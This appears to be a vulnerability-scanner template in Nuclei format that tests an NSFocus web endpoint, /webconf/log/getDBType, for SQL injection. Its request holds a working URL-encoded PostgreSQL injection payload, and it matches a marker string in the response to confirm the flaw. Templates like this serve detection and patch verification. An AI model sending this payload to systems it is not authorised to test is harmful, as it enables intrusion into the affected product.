id: NSFocus-getDBType-SQLInjection

info:
  name: NSFocus-getDBType-SQLInjection
  author: iSee857
  severity: high
  description: |
    NSFocus-getDBType-SQLInjection

http:
  - method: GET
    path:
      - "{{BaseURL}}/webconf/log/getDBType?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&sql=(SELECT+(CHR(113)%7C%7CCHR(122)%7C%7CCHR(122)%7C%7CCHR(107)%7C%7CCHR(113))%7C%7C(SELECT+(CASE+WHEN+(3788%3D3788)+THEN+1+ELSE+0+END))%3A%3Atext%7C%7C(CHR(113)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(113)%7C%7CCHR(113)))"

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "qzzkq1qppqq")'
          - 'status_code == 200'
        condition: and
